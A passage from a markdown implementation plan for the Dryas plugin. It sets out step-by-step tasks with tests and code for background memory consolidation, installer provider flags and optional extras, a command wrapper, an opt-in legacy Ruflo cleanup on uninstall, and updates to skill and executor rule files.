        except FileExistsError:
            try:
                if time.time() - os.path.getmtime(p) <= STALE_S:
                    return None
                os.remove(p)  # a crashed run left it; take over once
            except OSError:
                return None
    return None


def release(root: str, fd: int) -> None:
    try:
        os.close(fd)
    except OSError:
        pass
    try:
        os.remove(os.path.join(root, LOCK_NAME))
    except OSError:
        pass


def mark_pending(conn, ns: str) -> None:
    with memdb.tx(conn):
        conn.execute("INSERT OR REPLACE INTO kv (key, value) VALUES (?, ?)", (PREFIX + ns, str(time.time())))


def pending(conn) -> List[str]:
    return [r[0][len(PREFIX):] for r in conn.execute("SELECT key FROM kv WHERE key LIKE ? ORDER BY key", (PREFIX + "%",))]


def clear_pending(conn, ns: str) -> None:
    with memdb.tx(conn):
        conn.execute("DELETE FROM kv WHERE key = ?", (PREFIX + ns,))


def spawn(ns: Optional[str]) -> bool:
    argv = [paths.python(), "-X", "utf8", os.path.join(HERE, "memcli.py"), "consolidate"] + (["--ns", ns] if ns else [])
    kw = dict(stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, close_fds=True)
    if os.name == "nt":
        kw["creationflags"] = 0x00000008 | 0x00000200  # DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP
    else:
        kw["start_new_session"] = True
    try:
        subprocess.Popen(argv, **kw)
        return True
    except OSError:
        return False
```

If `memdb`'s `kv` table has different column names, read `memdb.py`'s schema and use them; the test reads only through these helpers. If `paths.python()` does not exist, use `sys.executable`.

- [ ] **Step 4: Wire the hooks.** In `memhooks.py`:
  - Add `import consolidate_bg` next to `import memlearn`.
  - In `on_session_end`, inside `if reason:` and after the `jevlog.append`, add:

    ```python
                consolidate_bg.mark_pending(conn, ns)
                consolidate_bg.spawn(ns)
    ```

  - At the end of `on_session_start`, before its `return`, keep the existing return value in a variable and add:

    ```python
        if consolidate_bg.pending(conn):
            consolidate_bg.spawn(None)  # memcli takes the lock; a run already going makes this one exit at once
    ```

- [ ] **Step 5: Lock and log in `memcli.py`.** In the `consolidate` branch:
  - Import `consolidate_bg`, `jevlog`, `paths` and `time`.
  - Before connecting, add `root = paths.data_root(); os.makedirs(root, exist_ok=True); fd = consolidate_bg.acquire(root)`. If it returns None: `print("consolidation already running"); return 0`.
  - With no `--ns`, the namespace list is `consolidate_bg.pending(conn)` united with the existing query.
  - Per namespace: time the call. On success, append `dict(stage="consolidate", ns=ns, ok=True, ms=int(...))` and call `consolidate_bg.clear_pending(conn, ns)`. If it raises, append `dict(stage="consolidate", ns=ns, ok=False, ms=..., error=type(e).__name__)` and continue.
  - Release in the outer `finally`.
  - The process still returns 1 only on a connection failure.
- [ ] **Step 6: Write `claude/jev/tune_memory.py`:**

```python
"""/tune lines for the memory store (owned core D): consolidation skipped inside hooks and background runs."""
from typing import Any, Dict, List


def summary(rows: List[Dict[str, Any]]) -> Dict[str, int]:
    s = {"skipped_budget": 0, "skipped_deadline": 0, "background_runs": 0, "background_failed": 0}
    for r in rows:
        if r.get("error") == "ConsolidateSkipped":
            k = "skipped_deadline" if r.get("detail") == "deadline" else "skipped_budget"
            s[k] += 1
        elif r.get("stage") == "consolidate":
            s["background_runs" if r.get("ok") is True else "background_failed"] += 1
    return s


def lines(s: Dict[str, int]) -> List[str]:
    n = s["skipped_budget"] + s["skipped_deadline"]
    return ["- Memory consolidation skipped in hooks: %d (budget %d, deadline %d)" % (n, s["skipped_budget"],
                                                                                   s["skipped_deadline"]),
            "- Background consolidation runs: %d ok, %d failed" % (s["background_runs"], s["background_failed"])]
```

  In `tune.py`:
  - `build()`: add `"memory": tune_memory.summary(read("memory"))`. If `read`'s log list has no `memory`, add it the same way the others are read.
  - `render()`: add `lines += tune_memory.lines(rep["memory"])` after the delivery lines.
  - The inventory picks up the two new `tune_line:` labels as additions; that is not a problem.
- [ ] **Step 7: Session-start warning.** In `rules_inject.py`, add `consolidate_warning(rows, now)`. It looks at rows from the last 7 days. If there are 3 or more `ConsolidateSkipped` rows and no `stage == "consolidate"` row with `ok is True` later than the last skip, it returns: `"Memory consolidation keeps skipping inside hooks (%d in 7 days) and no background run finished; run `dryas memory consolidate`."` Otherwise it returns `""`.

  Call it where the rules text is assembled, reading at most the last 200 lines of `memory.jsonl` through jevlog's log dir. Any exception means no line. Keep `test_rules_inject.py`'s size bounds passing: the line is printed only when the warning is non-empty.
- [ ] **Step 8: Run** `python3 tools/sync_codex_plugin.py` and everything in Done.
- [ ] **Step 9: Commit** `git add claude/jev/consolidate_bg.py claude/jev/memhooks.py claude/jev/memcli.py claude/jev/rules_inject.py claude/jev/tune_memory.py claude/jev/tune.py claude/jev/tests/test_consolidate_bg.py claude/jev/tests/test_tune_memory.py codex/jev` and `git commit -m "feat(memory): consolidate outside the hook budget, with a lock, a retry marker and /tune counts"`.

---

## Task 3: Installer provider slots and optional extras

Goal: a fresh install selects core, jev, memory, design and pstack-picks; Ruflo and Superpowers install only with `--with-ruflo` / `--with-superpowers`; `--judge` and `--memory` set the providers; an upgrade with no flags keeps its components and providers; preflight asks for Node only with Ruflo.
Scope:
- install/run_cmd.py
- install/plugin_setup.py
- install/codex_plugin_setup.py
- install/components.json
- claude/settings.fragment.json
- install/tests/test_providers_install.py
- install/tests/test_run_cmd.py
- install/tests/test_plugin_shape.py
- reference/inventory-map.json
Done:
- `python3 -m pytest -q install/tests` passes
- `python3 tools/inventory.py --check` prints `0 problems`
Failing test first: install/tests/test_providers_install.py :: SelectTest :: test_fresh_defaults_owned_core

**Interfaces:**
- Consumes: `run_cmd.parse`, `run_cmd.components`, `run_cmd.preflight`, `plugin_setup.write_chain_local(root, comps, flowobserve, repo=None, cd=None)`, the install record `<cd>/.dryas-plugin.json` (`rec["components"]`), `claude/jev/thresholds.set_value(dotted, value)`, `chain.json` stages with `"component": "memory"` (Task 1).
- Produces:
  - `run_cmd.OPTIONAL = ("jev", "memory", "ruflo", "superpowers", "design", "pstack-picks")` and `run_cmd.EXTRAS = ("ruflo", "superpowers")` (off unless selected or already installed).
  - `run_cmd.select(a: argparse.Namespace, recorded: Optional[List[str]]) -> List[str]`, which replaces the old `components(a)`. Keep `components(a)` as `select(a, None)` so existing callers and tests still work.
  - `run_cmd.providers(a, comps: List[str], recorded: Optional[List[str]]) -> Dict[str, Optional[str]]` with keys `judge` (`"local"`, `"jev"` or `None` = leave as is), `memory` (`"dryas"`, `"ruflo"` or `"none"`) and `process` (`"dryas"`).
  - `plugin_setup.write_chain_local(..., providers: Optional[dict] = None)` stores `loc["providers"] = providers` when given.
  - `plugin_setup.set_judge(provider: Optional[str]) -> None` writes `judge.provider` to the user thresholds and is a no-op for `None`.
  - Parser flags: `--judge {local,jev}`, `--memory {dryas,ruflo,none}`, `--with-ruflo`, `--with-superpowers`, `--with-design`, `--no-memory`.

Selection rules (`select`):
1. Start set:
   - Fresh (no recorded components): `core, jev, memory, design, pstack-picks`.
   - Upgrade: the recorded components, plus `core`. Add `memory` unless `ruflo` was recorded (memory provider ruflo kept). Add `jev` only if it was recorded (a 1.x `--no-jev` install keeps its gates off).
2. `--with-X` adds X. `--no-X` removes X (applied after `--with-X`; using both for one component is a parse error).
3. `--memory ruflo` adds `ruflo` and removes `memory`. `--memory none` removes both. `--memory dryas` adds `memory`.
4. `--judge local|jev`, `--no-jev` or `--openrouter-key` adds `jev`. `--no-jev` sets the judge to `local`, so the alias no longer removes the stages.
5. The order follows `OPTIONAL`, with `core` first.

- [ ] **Step 1: Write the failing tests** in `install/tests/test_providers_install.py`:

```python
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
import platform_util as pu
import plugin_setup as ps
import run_cmd

P = run_cmd.parse
UP_1X = ["core", "jev", "ruflo", "superpowers", "design", "pstack-picks"]


class SelectTest(unittest.TestCase):
    def test_fresh_defaults_owned_core(self):
        self.assertEqual(run_cmd.select(P([]), None), ["core", "jev", "memory", "design", "pstack-picks"])

    def test_with_flags_add_extras(self):
        self.assertEqual(run_cmd.select(P(["--with-ruflo", "--with-superpowers"]), None),
                         ["core", "jev", "memory", "ruflo", "superpowers", "design", "pstack-picks"])

    def test_upgrade_without_flags_keeps_extras_and_providers(self):
        comps = run_cmd.select(P([]), UP_1X)
        self.assertEqual(comps, UP_1X)  # memory stays off: Ruflo memory is kept
        pv = run_cmd.providers(P([]), comps, UP_1X)
        self.assertEqual(pv, {"judge": None, "memory": "ruflo", "process": "dryas"})

    def test_upgrade_of_no_jev_install_keeps_gates_off_until_judge_flag(self):
        rec = ["core", "design"]
        self.assertNotIn("jev", run_cmd.select(P([]), rec))
        self.assertIn("jev", run_cmd.select(P(["--judge", "local"]), rec))

    def test_aliases(self):
        a = P(["--no-jev"])
        self.assertIn("jev", run_cmd.select(a, None))
        self.assertEqual(run_cmd.providers(a, run_cmd.select(a, None), None)["judge"], "local")
        k = P(["--openrouter-key", "sk-x"])
        self.assertEqual(run_cmd.providers(k, run_cmd.select(k, None), None)["judge"], "jev")
        self.assertNotIn("design", run_cmd.select(P(["--no-design"]), None))
        self.assertNotIn("ruflo", run_cmd.select(P(["--no-ruflo"]), UP_1X))

    def test_memory_slot(self):
        r = run_cmd.select(P(["--memory", "ruflo"]), None)
        self.assertIn("ruflo", r)
        self.assertNotIn("memory", r)
        n = run_cmd.select(P(["--memory", "none"]), UP_1X)
        self.assertNotIn("ruflo", n)
        self.assertNotIn("memory", n)
        self.assertEqual(run_cmd.providers(P([]), ["core", "jev", "memory"], None)["memory"], "dryas")

    def test_with_and_no_same_component_is_an_error(self):
        with self.assertRaises(SystemExit):
            P(["--with-ruflo", "--no-ruflo"])


class PreflightTest(unittest.TestCase):
    def test_fresh_install_needs_no_node_and_allows_spaces(self):
        found = {"python3": "/usr/bin/python3", "git": "/usr/bin/git", "claude": "/usr/bin/claude"}
        with mock.patch.object(pu, "which", lambda n: found.get(n, "")), \
                mock.patch.object(pu, "space_free", lambda p: None):
            probs = run_cmd.preflight(run_cmd.select(P([]), None), "claude", Path("/Users/A B/.claude"))
        self.assertEqual(probs, [])

    def test_with_ruflo_still_needs_node(self):
        with mock.patch.object(pu, "which", lambda n: "" if n in ("node", "npm") else "/x/" + n):
            probs = run_cmd.preflight(run_cmd.select(P(["--with-ruflo"]), None), "claude", Path("/x/.claude"))
        self.assertTrue(any("node" in p.lower() for p in probs))


class ChainLocalProvidersTest(unittest.TestCase):
    def test_providers_recorded_and_memory_stages_toggle(self):
        root = Path(tempfile.mkdtemp())
        ps.write_chain_local(root, ["core", "jev", "memory"], None,
                             providers={"judge": None, "memory": "dryas", "process": "dryas"})
        loc = json.loads((root / "chain.local.json").read_text(encoding="utf-8"))
        self.assertEqual(loc["providers"]["memory"], "dryas")
        self.assertIn("memory", [c for c in run_cmd.OPTIONAL if c not in loc["off"]])
        ps.write_chain_local(root, ["core", "jev", "ruflo"], None,
                             providers={"judge": None, "memory": "ruflo", "process": "dryas"})
        loc = json.loads((root / "chain.local.json").read_text(encoding="utf-8"))
        self.assertIs(loc["stages"]["post"]["mem-edit"]["enabled"], False)
        self.assertIn("memory", loc["off"])


class JudgeFlagTest(unittest.TestCase):
    def test_set_judge_writes_user_thresholds(self):
        d = tempfile.mkdtemp()
        with mock.patch.dict(os.environ, {"DRYAS_DATA_ROOT": d, "JEV_THRESHOLDS": os.path.join(d, "t.json")}):
            ps.set_judge("local")
            ps.set_judge(None)
            sys.path.insert(0, str(HERE.parent.parent / "claude" / "jev"))
            import thresholds
            self.assertEqual(thresholds.load()["judge"]["provider"], "local")
```

Before writing, read `thresholds.path()` to find the env var that picks the user thresholds file, and use it in `JudgeFlagTest`. `JEV_THRESHOLDS` is a placeholder for whatever name `paths.py` uses.

- [ ] **Step 2: Run** `python3 -m pytest -q install/tests/test_providers_install.py` → FAIL (`AttributeError: select`).
- [ ] **Step 3: Parser and selection in `install/run_cmd.py`.**
  - Set `OPTIONAL = ("jev", "memory", "ruflo", "superpowers", "design", "pstack-picks")` and add `EXTRAS = ("ruflo", "superpowers")`.
  - In `parse()`, keep the `--no-<c>` loop. Add `--with-ruflo`, `--with-superpowers`, `--with-design` (`store_true`), `--judge` (choices `local`, `jev`, default `None`) and `--memory` (choices `dryas`, `ruflo`, `none`, default `None`).
  - After `ap.parse_args(argv)`, call `ap.error("--with-%s and --no-%s together" % (c, c))` when both flags of a component are set.
  - Implement `select` and `providers` by the rules above. `providers`:
    - judge: `"jev"` if `a.judge == "jev"` or `a.openrouter_key`; `"local"` if `a.judge == "local"` or `a.no_jev`; else `None`.
    - memory: `"dryas"` if `memory` is in comps, `"ruflo"` if `ruflo` is in comps, else `"none"`.
    - process: always `"dryas"`. Superpowers only coexists; the rules point at the Dryas skills.
  - In `main()`:
    - Read `recorded = ps._load_json(cd / ps.RECORD, {}).get("components") or None` (only when the file exists and is a dict).
    - Compute `comps = select(a, recorded)`.
    - `no_flags` now also checks the `with_*`, `judge` and `memory` flags.
    - Pass `providers=providers(a, comps, recorded)` to `ps.setup`.
  - Update `NO_RUFLO_EFFECT` and `NO_SPACE_RUFLO`: they now suggest leaving out `--with-ruflo` (and still mention `--no-ruflo` for an upgrade that has Ruflo).
- [ ] **Step 4: `install/plugin_setup.py`.**
  - `setup(...)` takes `providers=None`. Before `write_chain_local`, it calls `set_judge(providers.get("judge"))`. It passes `providers` to `write_chain_local`, which stores `loc["providers"] = providers` when given.
  - Add `set_judge`:

```python
def set_judge(provider: Optional[str]) -> None:
    """--judge / --no-jev / --openrouter-key: the user's judge.provider. None leaves the current value (upgrade)."""
    if provider is None:
        return
    sys.path.insert(0, str(REPO / "claude" / "jev"))
    import thresholds
    thresholds.set_value("judge.provider", provider)
```

  `plugin_setup.py` keeps its own `OPTIONAL`; set it to the new tuple, or import it from `run_cmd` if that creates no cycle. The superpowers marketplace is added only when superpowers is selected, which is already true.
- [ ] **Step 5: Settings fragment.** In `claude/settings.fragment.json`, move `mcp__plugin_dryas_jev` from the `jev` block's allow list to `core`'s, so memory tools work with gates off. Leave the `jev` block present but empty (`{}`): the inventory lists it, and `di._fragment` skips an empty block. Run `inventory.py --check`. If it reports `permission:...` as lost because the inventory records the block, add one map row to `reference/inventory-map.json` from the old entry to the new one, and name it in the commit body.
- [ ] **Step 6: Codex.** `codex_plugin_setup.setup` receives the same `comps`. `[mcp_servers.ruflo]` is already conditional on `"ruflo" in comps`. Add one test to `test_providers_install.py`, `test_codex_toml_has_no_ruflo_by_default`: call `cps.toml_block(run_cmd.select(P([]), None), "/p", "/d", {}, "python3")` and assert `"mcp_servers.ruflo"` is not in it. Read `toml_block`'s signature first and match it.
- [ ] **Step 7: Named exception.** In `install/tests/test_run_cmd.py::RunCmdTest::test_components`, replace the two expected lists. `components(parse(["--no-ruflo"]))` is now `["core", "jev", "memory", "design", "pstack-picks"]`, and so is `components(parse([]))`. `test_plugin_shape.py` changes only if it asserts components.json's set: components.json keeps `superpowers`, `ruflo` and `design` unchanged.
- [ ] **Step 8: Run** `python3 -m pytest -q install/tests` and the inventory check. Fix any existing test that fails because it assumed Ruflo or Superpowers on by default. Change the call to pass `--with-ruflo` or `--with-superpowers`, never the assertion, and list each such file in the commit body (they become named exceptions of this task).
- [ ] **Step 9: Commit** `git add install/run_cmd.py install/plugin_setup.py install/codex_plugin_setup.py claude/settings.fragment.json install/tests/test_providers_install.py install/tests/test_run_cmd.py reference/inventory-map.json`, plus any test file changed in Step 8, then `git commit -m "feat(install): judge and memory providers, Ruflo and Superpowers as optional extras"`.

---

## Task 4: `dryas` wrapper and the legacy cleanup on uninstall

Goal: `dryas memory <subcommand>` runs `memcli.py` on macOS, Linux and Windows; `--uninstall` offers (lists and confirms each, never by default) removal of the Ruflo plugins, the global `ruflo` npm package and `~/.dryas/ruflo`.
Scope:
- claude/bin/dryas
- claude/bin/dryas.cmd
- install/plugin_setup.py
- install/run_cmd.py
- claude/settings.fragment.json
- install/tests/test_dryas_wrapper.py
- install/tests/test_legacy_cleanup.py
Done:
- `python3 -m pytest -q install/tests/test_dryas_wrapper.py install/tests/test_legacy_cleanup.py install/tests/test_install_uninstall.py install/tests/test_e2e_install.py install/tests/test_portability.py` passes
- `python3 tools/inventory.py --check` prints `0 problems`
Failing test first: install/tests/test_legacy_cleanup.py :: LegacyTest :: test_each_item_listed_and_confirmed

**Interfaces:**
- Consumes: `run_cmd.main` uninstall branch; `plugin_setup.extras_commands(rec, last_account)`; `di.confirm(prompt) -> bool`; `plugin_setup.data_root()`.
- Produces:
  - `plugin_setup.legacy_items(cd: Path, rec: dict, last_account: bool) -> List[Tuple[str, Optional[List[str]], Optional[Path]]]`. Each item is `(label, argv or None, path or None)`. The items:
    - one `claude plugin uninstall <id>` per installed Ruflo plugin (`ruflo-core@ruflo`, `ruflo-swarm@ruflo`, `ruflo-testgen@ruflo`, `ruflo-jujutsu@ruflo`) that `installed_plugins.json` lists, whether or not Dryas installed it;
    - `npm uninstall -g ruflo`, only when this is the last account and `npm` is on PATH;
    - `<data_root>/ruflo`, only when it exists.
  - `plugin_setup.run_legacy(items, yes: bool) -> int` asks `di.confirm("Remove %s?" % label)` for each item (with `--yes`, items are still listed but no prompt is shown). It runs the argv or `shutil.rmtree`s the path, and returns the number of failures.
  - `claude/bin/dryas` (sh) and `claude/bin/dryas.cmd` (Windows): `dryas memory ARGS…` → `memcli.py ARGS…`. Any other first word prints usage and exits 2.

- [ ] **Step 1: Write the failing tests.** `install/tests/test_legacy_cleanup.py`:

```python
import json
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import dryas_install as di
import plugin_setup as ps


class LegacyTest(unittest.TestCase):
    def setUp(self):
        self.cd = Path(tempfile.mkdtemp())
        (self.cd / "plugins").mkdir()
        (self.cd / "plugins" / "installed_plugins.json").write_text(json.dumps(
            {"plugins": {"ruflo-core@ruflo": [{}], "ruflo-swarm@ruflo": [{}], "impeccable@impeccable": [{}]}}),
            encoding="utf-8")
        self.root = Path(tempfile.mkdtemp())
        (self.root / "ruflo").mkdir()
        p = mock.patch.object(ps, "data_root", lambda: self.root)
        p.start()
        self.addCleanup(p.stop)

    def test_each_item_listed_and_confirmed(self):
        with mock.patch("shutil.which", lambda n: "/usr/bin/" + n):
            items = ps.legacy_items(self.cd, {}, last_account=True)
        labels = [i[0] for i in items]
        self.assertTrue(any("ruflo-core@ruflo" in l for l in labels))
        self.assertTrue(any("ruflo-swarm@ruflo" in l for l in labels))
        self.assertFalse(any("impeccable" in l for l in labels))
        self.assertTrue(any("npm uninstall -g ruflo" in l for l in labels))
        self.assertTrue(any(str(self.root / "ruflo") in l for l in labels))
        asked = []
        with mock.patch.object(di, "confirm", lambda q: asked.append(q) or False), \
                mock.patch.object(di, "run", side_effect=AssertionError("ran unasked")):
            self.assertEqual(ps.run_legacy(items, yes=False), 0)
        self.assertEqual(len(asked), len(items))
        self.assertTrue((self.root / "ruflo").exists())  # never removed by default

    def test_not_last_account_keeps_npm_package(self):
        with mock.patch("shutil.which", lambda n: "/usr/bin/" + n):
            labels = [i[0] for i in ps.legacy_items(self.cd, {}, last_account=False)]
        self.assertFalse(any("npm" in l for l in labels))

    def test_yes_removes_dir(self):
        items = [("remove %s" % (self.root / "ruflo"), None, self.root / "ruflo")]
        self.assertEqual(ps.run_legacy(items, yes=True), 0)
        self.assertFalse((self.root / "ruflo").exists())
```

`install/tests/test_dryas_wrapper.py` checks four things:
- On POSIX (skip on Windows): `subprocess.run(["sh", "claude/bin/dryas", "memory", "--db", <tmp>/d.db, "stats"])` exits 0.
- `["sh", "claude/bin/dryas", "nope"]` exits 2 with `usage:` in its output.
- On Windows (skip elsewhere): the same through `cmd /c claude\bin\dryas.cmd`.
- On every OS, both files contain `jev/memcli.py` (or `jev\memcli.py`).

- [ ] **Step 2: Run** them → FAIL.
- [ ] **Step 3: Wrappers.** `claude/bin/dryas`:

```sh
#!/bin/sh
# Dryas command-line entry (owned core D). `dryas memory ...` runs the memory CLI with the Dryas Python.
here=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
case "$1" in
  memory) shift; exec "$here/dryas-py" "$here/../jev/memcli.py" "$@" ;;
  *) echo "usage: dryas memory {import-ruflo|consolidate|stats} [options]" >&2; exit 2 ;;
esac
```

  `claude/bin/dryas.cmd`:

```bat
@echo off
rem Dryas command-line entry (owned core D). `dryas memory ...` runs the memory CLI.
if /I "%~1"=="memory" goto memory
echo usage: dryas memory {import-ruflo^|consolidate^|stats} [options] 1>&2
exit /b 2
:memory
shift
set "PYX=%DRYAS_PY%"
if "%PYX%"=="" set "PYX=python"
"%PYX%" -X utf8 "%~dp0..\jev\memcli.py" %1 %2 %3 %4 %5 %6 %7 %8 %9
```

  Mark `claude/bin/dryas` executable with `git update-index --chmod=+x claude/bin/dryas` (no `os.chmod` in shipped code). Add the allow rule `Bash("$CD/bin/dryas" memory:*)` to the `core` block of `claude/settings.fragment.json`, beside the `dryas-py` rules.
- [ ] **Step 4: Legacy cleanup** in `plugin_setup.py`:
  - Add `RUFLO_PLUGINS = ("ruflo-core@ruflo", "ruflo-swarm@ruflo", "ruflo-testgen@ruflo", "ruflo-jujutsu@ruflo")`, then `legacy_items` and `run_legacy` as specified.
  - Read `installed_plugins.json` with the same helper the version warning uses in `run_cmd.thirdparty`.
  - `extras_commands` already covers Ruflo plugins that Dryas installed. `legacy_items` must not list a command twice: skip a plugin id that `extras_commands` already returns.
  - In `run_cmd.main`'s uninstall branch, after the extras prompt and when `want_claude`, add `legacy = ps.legacy_items(cd, rec, last_account=not others)`. When it is non-empty and `--keep-extras` is not set, print `"Legacy Ruflo pieces (each asked separately):"` and run `ps.run_legacy(legacy, a.yes)` after `ps.uninstall`. A failure only warns.
- [ ] **Step 5: Run** everything in Done. `test_install_uninstall.py::UninstallConfirmTest` must still pass unchanged. If it captures prompts, the new prompts come after the existing ones, so its expectations hold.
- [ ] **Step 6: Commit** `git add claude/bin/dryas claude/bin/dryas.cmd install/plugin_setup.py install/run_cmd.py claude/settings.fragment.json install/tests/test_dryas_wrapper.py install/tests/test_legacy_cleanup.py` and `git commit -m "feat(install): dryas memory wrapper and an opt-in legacy Ruflo cleanup on uninstall"`.

---

## Task 5: Process wiring — Dryas memory tools, executor commits, the governance pointer

Goal: both orchestrate skills use the Dryas memory tools (`memory_search`, `memory_store`, `swarm_init` on the `jev` server) and keep the Ruflo names only as the optional-extra reference; executor rule 5 allows a task commit when the dispatch prompt allows it; the review-receive pointer no longer points outside the plugin; the rules template's layer and hook-order lines describe the owned core.
Scope:
- claude/skills/orchestrate/SKILL.md
- claude/skills/orchestrate/ruflo-tools.md
- codex/skills/orchestrate/SKILL.md
- claude/agents/executor.md
- claude/skills/review-receive/SKILL.md
- codex/skills/review-receive/**
- claude/CLAUDE.md.template
- codex/AGENTS.md.template
- claude/commands/tune.md
- install/tests/test_claude_md_template.py
- install/tests/test_owned_core_wiring.py
- tools/sync_codex_plugin.py
Done:
- `python3 -m pytest -q install/tests claude/jev/tests/test_rules_inject.py` passes
- `python3 tools/sync_codex_plugin.py --check` exits 0; `python3 tools/inventory.py --check` prints `0 problems`
Failing test first: install/tests/test_owned_core_wiring.py :: WiringTest :: test_orchestrate_uses_dryas_memory_tools

**Interfaces:**
- Consumes: the tool names `mcp__plugin_dryas_jev__memory_search`, `mcp__plugin_dryas_jev__memory_store` and `mcp__plugin_dryas_jev__swarm_init` (plan B); on Codex, bare names on server `jev`.
- Produces: the orchestrate skill's dispatch section (§5) has the sentence `The dispatch prompt allows the executor to commit its own task: explicit paths, conventional message; never push, merge or create worktrees.`, and its report step asks for `lines` (from `git diff --numstat`) in the `log_dispatch` return record (Task 8 consumes it). The executor's rule 5 reads exactly: `5. Commit your own task only when the dispatch prompt allows it (explicit paths, conventional message); never push, merge or create worktrees. Do not dispatch subagents.`

- [ ] **Step 1: Write the failing test** `install/tests/test_owned_core_wiring.py`:

```python
import re
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
read = lambda p: (ROOT / p).read_text(encoding="utf-8")


class WiringTest(unittest.TestCase):
    def test_orchestrate_uses_dryas_memory_tools(self):
        s = read("claude/skills/orchestrate/SKILL.md")
        for t in ("memory_search", "memory_store", "swarm_init"):
            self.assertIn("mcp__plugin_dryas_jev__" + t, s)
        self.assertNotIn("mcp__plugin_ruflo-core_ruflo__", s.split("---", 2)[1])  # allowed-tools front matter
        self.assertNotIn("Ruflo memory", s)
        cx = read("codex/skills/orchestrate/SKILL.md")
        self.assertNotIn("server `ruflo`", cx)
        self.assertIn("server `jev`", cx)

    def test_ruflo_reference_is_the_optional_extra(self):
        first = read("claude/skills/orchestrate/ruflo-tools.md").splitlines()[0]
        self.assertIn("optional", first.lower())

    def test_executor_commit_rule(self):
        e = read("claude/agents/executor.md")
        self.assertIn("5. Commit your own task only when the dispatch prompt allows it (explicit paths, conventional "
                      "message); never push, merge or create worktrees.", e)
        self.assertNotIn("Do not commit, push", e)
        self.assertIn("allows the executor to commit its own task", read("claude/skills/orchestrate/SKILL.md"))
        self.assertIn("commit its own task", read("codex/skills/orchestrate/SKILL.md"))

    def test_review_receive_pointer_is_shipped(self):
        for p in ("claude/skills/review-receive/SKILL.md", "codex/skills/review-receive/SKILL.md"):
            self.assertNotIn("docs/governance.md", read(p), p)

    def test_templates_describe_owned_layers(self):
        t = read("claude/CLAUDE.md.template")
        self.assertIn("scope lock -> gate -> memory -> observer", t)
        self.assertNotIn("the only memory/learning layer", t)
        a = read("codex/AGENTS.md.template")
        self.assertNotIn("Ruflo is the memory", a)
        self.assertIn("memory_search", a)

    def test_tune_command_has_no_ruflo_cost_note(self):
        self.assertNotIn("ruflo-cost-tracker", read("claude/commands/tune.md"))
```

- [ ] **Step 2: Run** → FAIL.
- [ ] **Step 3: Orchestrate skill (Claude)** `claude/skills/orchestrate/SKILL.md`:
  - **Front matter `allowed-tools`.** Replace the three `mcp__plugin_ruflo-core_ruflo__*` entries with `mcp__plugin_dryas_jev__memory_search, mcp__plugin_dryas_jev__memory_store, mcp__plugin_dryas_jev__swarm_init`.
  - **Description and :10.** Replace "Ruflo memory" with "Dryas memory". The ToolSearch example becomes `select:mcp__plugin_dryas_jev__memory_search`.
  - **:22.** `Search Dryas memory (mcp__plugin_dryas_jev__memory_search, namespace = main repo folder name). With the Ruflo extra selected as the memory provider, use the tools in ruflo-tools.md instead.`
  - **:65.** `Open the task ledger once (mcp__plugin_dryas_jev__swarm_init with topology "hierarchical"); the log_dispatch record stays the ledger of record.`
  - **:82.** `Store the outcome (mcp__plugin_dryas_jev__memory_store, kind outcome, with task_id and the commit).`
  - **§5 Dispatch.** Add the commit sentence from Interfaces, plus: `After the executor returns, log the return record (log_dispatch with phase "return") with tokens, duration_ms and lines = added + deleted lines of the task's commit (git diff --numstat <base>..HEAD).`
- [ ] **Step 4: `ruflo-tools.md`.** The first line becomes `# Ruflo tool names (optional extra: --with-ruflo, memory provider ruflo)`. Add a second paragraph: `The Dryas core provides memory_search, memory_store and swarm_init on its own jev server; use these Ruflo names only when the install chose --memory ruflo.` Keep the rest. It is the kept reference that the inventory lists.
- [ ] **Step 5: Codex orchestrate** `codex/skills/orchestrate/SKILL.md`. It is hand-written, not generated.
  - Description: replace "and Ruflo memory" with "and Dryas memory".
  - :11: "Call `memory_search` (server `jev`, …)".
  - :28: "Store each outcome with `memory_store` (server `jev`)."
  - In the worker line (:27), add: "A worker may commit its own task only when you allow it in its prompt (explicit paths, conventional message); workers never push, merge or create worktrees."
  - Then run `python3 tools/sync_codex_plugin.py --check`. If the `SHARED` token comparison flags the tool names, update `SKILL_ALLOW` in `tools/sync_codex_plugin.py` (one entry) rather than reword the Claude skill.
- [ ] **Step 6: Executor.** In `claude/agents/executor.md`, replace rule 5 with the exact text from Interfaces.
- [ ] **Step 7: Review-receive pointer.** In `claude/skills/review-receive/SKILL.md:53`, replace `(local or Jev, set by \`judge.provider\` in thresholds; see \`docs/governance.md\`)` with `(local rules, or the Jev model when \`judge.provider\` in thresholds is \`jev\`; below its confidence threshold a judge answer goes to the strong tier)`. Then run the sync so the Codex render follows.
- [ ] **Step 8: Templates.**
  - In `claude/CLAUDE.md.template`, the layers line becomes: `Layers: Jev = decision support (gates, routing; the local judge or the Jev model; never writes code or plans), Dryas memory = the memory/learning layer (Ruflo memory when that extra is selected), Dryas skills = process; Superpowers and Ruflo are optional extras, and the rules point at the Dryas skills even when they are installed.` The hook line becomes: `Hook order per event: scope lock -> gate -> memory -> observer (observe-only, last).`
  - In `codex/AGENTS.md.template`:
    - :20 heading: `## Jev and Dryas memory (MCP server \`jev\`; \`ruflo\` only with the Ruflo extra)`.
    - :23: `Dryas memory: \`memory_search\` before a task, \`memory_store\` after success; namespace = the main repo's folder name.`
    - :28: drop "and the Ruflo hooks" and say `the memory hooks other than session start`.
  - **Named exception:** in `install/tests/test_claude_md_template.py`, replace the needle `scope lock -> Jev -> Ruflo` with `scope lock -> gate -> memory -> observer`.
- [ ] **Step 9: `/tune` note.** In `claude/commands/tune.md:7`, delete the parenthesis `(ruflo-cost-tracker is disabled)`. Its sentence stays otherwise. Its Codex twin is `codex/skills/tune/SKILL.md`: change it only if it has the same parenthesis.
- [ ] **Step 10: Run** everything in Done. If the inventory reports `allowed_tool:claude:skill/orchestrate:mcp__plugin_ruflo-core_ruflo__memory_search` (and the two others) as lost, add three rows to `reference/inventory-map.json` mapping each to its `mcp__plugin_dryas_jev__` twin. Those are the expected equivalences, and the Ruflo names stay documented in `ruflo-tools.md`.
- [ ] **Step 11: Commit** all Scope paths that changed, plus `reference/inventory-map.json` if touched, with `git commit -m "feat(process): Dryas memory tools in orchestrate, executor task commits, shipped governance wording"`.

---

